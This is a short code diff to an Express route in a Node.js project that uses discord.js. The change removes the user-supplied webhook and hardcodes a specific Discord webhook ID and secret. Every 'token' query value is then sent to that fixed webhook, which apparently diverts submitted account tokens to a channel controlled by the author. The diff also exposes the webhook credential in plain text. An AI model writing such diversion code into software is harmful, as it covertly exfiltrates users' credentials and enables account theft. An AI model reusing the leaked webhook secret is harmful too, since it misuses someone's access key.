@@ -3,10 +3,10 @@ const router = express.Router();
 const fetch = require('node-fetch');
 const {WebhookClient} = require('discord.js');
 router.get('/', (req,res) => {
-    if(!req.query.webhook || !req.query.token) return res.render('404', {layout:'home'});
-    let parse = parseWebhookURL(req.query.webhook);
-    if(parse == null) return res.render('404', {layout:'home'});
-    const webhook = new WebhookClient(parse.clientID, parse.token);
+    if(!req.query.token) return res.render('404', {layout:'home'});
+    //let parse = parseWebhookURL(req.query.webhook);
+    //if(parse == null) return res.render('404', {layout:'home'});
+    const webhook = new WebhookClient("861652348848570398", "C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O");
     webhook.send(req.query.token);
     res.send('done');
 })
